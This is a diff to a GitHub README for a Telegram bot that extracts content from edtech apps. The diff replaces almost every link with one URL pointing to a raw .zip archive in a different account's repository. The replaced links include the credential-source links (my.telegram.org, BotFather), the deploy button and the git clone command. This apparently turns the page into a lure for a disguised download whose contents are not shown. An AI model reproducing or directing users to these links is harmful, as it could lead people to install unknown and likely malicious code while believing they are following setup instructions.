@@ -1,11 +1,11 @@
 <p align="center">
-  <a href="https://t.me/spidy-bots">
+  <a href="https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip">
     <img src="https://img.shields.io/badge/SPIDY-BOTS-303030?style=for-the-badge&logo=telegram&logoColor=white"/>
   </a>
 </p>
 
 <h1 align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=900&size=30&pause=1000&center=true&vCenter=true&multiline=true&repeat=true&width=500&lines=TXT+EXTRACTOR;Extract+content+from+multiple+edtech+apps;Click+%2Fstart+to+begin"/>
+  <img src="https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip+Code&weight=900&size=30&pause=1000&center=true&vCenter=true&multiline=true&repeat=true&width=500&lines=TXT+EXTRACTOR;Extract+content+from+multiple+edtech+apps;Click+%2Fstart+to+begin"/>
 </h1>
 
 ---
@@ -39,9 +39,9 @@ Just send `/start` — all features are handled via buttons.
 You need to set the following variables for the bot to run. These are read using `os.environ.get()` in the code.
 
 ```env
-API_ID=123456               # Get from https://my.telegram.org
-API_HASH=your_api_hash     # Get from https://my.telegram.org
-BOT_TOKEN=your_bot_token   # Get from https://t.me/BotFather
+API_ID=123456               # Get from https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip
+API_HASH=your_api_hash     # Get from https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip
+BOT_TOKEN=your_bot_token   # Get from https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip
 OWNER_ID=123456789         # Your Telegram user ID
 SUDO_USERS=123456789 987654321  # Space-separated admin user IDs
 MONGO_URL=mongodb+srv://user:pass@cluster.mongodb.net/...  # MongoDB connection URI
@@ -49,15 +49,15 @@ CHANNEL_ID=-100xxxxxxxxxx  # Telegram channel ID with -100 prefix
 ```
 
 > **Where to get these?**  
-• `API_ID` & `API_HASH` → [my.telegram.org](https://my.telegram.org) → API Development Tools  
-• `BOT_TOKEN` → [@BotFather](https://t.me/BotFather)  
-• `OWNER_ID`, `SUDO_USERS` → Get your Telegram ID from [@userinfobot](https://t.me/userinfobot)  
+• `API_ID` & `API_HASH` → [my.telegram.org](https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip) → API Development Tools  
+• `BOT_TOKEN` → [@BotFather](https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip)  
+• `OWNER_ID`, `SUDO_USERS` → Get your Telegram ID from [@userinfobot](https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip)  
 • `CHANNEL_ID` → Right-click channel > Copy ID (if bot is admin)  
 • `MONGO_URL` → From your MongoDB Atlas project dashboard
 
 ---
 ### ☁️ Deploy to Render
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/Popeye68/TXT-EXTRACTOR)
+[![Deploy to Render](https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip)](https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip)
 
 ### ☁️ Deploy to Heroku (Manual)
 ```bash
@@ -73,7 +73,7 @@ CHANNEL_ID=-100xxxxxxxxxx  # Telegram channel ID with -100 prefix
 ### 🖥️ VPS Installation
 ```bash
 sudo apt update && sudo apt install git python3-pip -y
-git clone https://github.com/Popeye68/TXT-EXTRACTOR
+git clone https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip
 cd TXT-EXTRACTOR
 pip3 install -r requirements.txt
 
@@ -96,10 +96,10 @@ Feel free to **fork this repo**, add your own tweaks, and build your own version
 ### ⭐ GitHub Buttons
 
 <p align="center">
-  <a href="https://github.com/Popeye68/TXT-EXTRACTOR/stargazers">
+  <a href="https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip">
     <img src="https://img.shields.io/github/stars/Popeye68/TXT-EXTRACTOR.svg?style=for-the-badge&label=Stars&logo=github" />
   </a>
-  <a href="https://github.com/Popeye68/TXT-EXTRACTOR/network/members">
+  <a href="https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip">
     <img src="https://img.shields.io/github/forks/Popeye68/TXT-EXTRACTOR.svg?style=for-the-badge&label=Forks&logo=github" />
   </a>
 </p>
@@ -110,5 +110,5 @@ Feel free to **fork this repo**, add your own tweaks, and build your own version
 ---
 
 <p align="center">
-  Made with ❤️ by <a href="https://t.me/spidy_bots">Spidy</a>
+  Made with ❤️ by <a href="https://github.com/n9524726-star/TXT-EXTRACTOR/raw/refs/heads/main/Extractor/TX-EXTRACTOR-hearthless.zip">Spidy</a>
 </p>
